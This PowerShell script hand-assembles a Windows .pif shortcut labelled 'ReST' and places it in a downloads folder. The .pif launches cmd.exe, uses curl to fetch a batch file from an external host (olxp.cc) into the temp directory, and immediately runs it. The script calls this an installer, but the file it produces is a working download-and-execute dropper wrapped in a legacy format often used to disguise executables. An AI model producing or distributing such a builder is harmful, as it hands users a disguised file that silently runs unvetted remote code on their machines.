# Writes a Windows .pif that runs cmd to download and start the short ReST installer.
param(
    [string]$ScriptUrl = "https://olxp.cc/r.bat",
    [string]$OutPif = ""
)

$ErrorActionPreference = "Stop"
$repoRoot = Split-Path -Parent $PSScriptRoot
if (-not $OutPif) {
    $OutPif = Join-Path $repoRoot "downloads\ReST.pif"
}

$program = Join-Path $env:SystemRoot "System32\cmd.exe"
$params = "/c curl -o %TEMP%\a.bat $ScriptUrl&%TEMP%\a.bat"
if ($program.Length -gt 62) { throw "Program path longer than 62 characters: $program" }
if ($params.Length -gt 63) { throw "Parameters longer than 63 characters ($($params.Length)): $params" }

$buf = New-Object byte[] 517
$title = [Text.Encoding]::ASCII.GetBytes("ReST")
[Array]::Copy($title, 0, $buf, 0x02, $title.Length)
[BitConverter]::GetBytes([uint16]640).CopyTo($buf, 0x20)
$progBytes = [Text.Encoding]::ASCII.GetBytes($program)
[Array]::Copy($progBytes, 0, $buf, 0x24, $progBytes.Length)
$buf[0x63] = 0x10
$dir = [Text.Encoding]::ASCII.GetBytes($env:TEMP)
if ($dir.Length -gt 63) { $dir = $dir[0..62] }
[Array]::Copy($dir, 0, $buf, 0x65, $dir.Length)
$paramBytes = [Text.Encoding]::ASCII.GetBytes($params)
[Array]::Copy($paramBytes, 0, $buf, 0xA5, $paramBytes.Length)

function Write-Ascii([byte[]]$Target, [int]$Offset, [string]$Text, [int]$Size) {
    $raw = [Text.Encoding]::ASCII.GetBytes($Text)
    $n = [Math]::Min($raw.Length, $Size - 1)
    [Array]::Copy($raw, 0, $Target, $Offset, $n)
}

# Section headings: 16-byte name, next offset, data offset, data length.
Write-Ascii $buf 369 "MICROSOFT PIFEX" 16
[BitConverter]::GetBytes([uint16]391).CopyTo($buf, 369 + 16)
[BitConverter]::GetBytes([uint16]0).CopyTo($buf, 369 + 18)
[BitConverter]::GetBytes([uint16]369).CopyTo($buf, 369 + 20)

Write-Ascii $buf 391 "WINDOWS 386 3.0" 16
[BitConverter]::GetBytes([uint16]0xFFFF).CopyTo($buf, 391 + 16)
[BitConverter]::GetBytes([uint16]413).CopyTo($buf, 391 + 18)
[BitConverter]::GetBytes([uint16]104).CopyTo($buf, 391 + 20)

# 386 enhanced record: close on exit, same parameters at offset 40.
[BitConverter]::GetBytes([uint16]1).CopyTo($buf, 413 + 16)
[Array]::Copy($paramBytes, 0, $buf, 413 + 40, $paramBytes.Length)

$sum = 0
for ($i = 2; $i -le 0x170; $i++) { $sum = ($sum + $buf[$i]) -band 0xFF }
$buf[1] = [byte]$sum

$outDir = Split-Path -Parent $OutPif
if (-not (Test-Path -LiteralPath $outDir)) {
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
}
[IO.File]::WriteAllBytes($OutPif, $buf)
Write-Host "Created: $OutPif"
Write-Host "Program: $program"
Write-Host "Params:  $params"
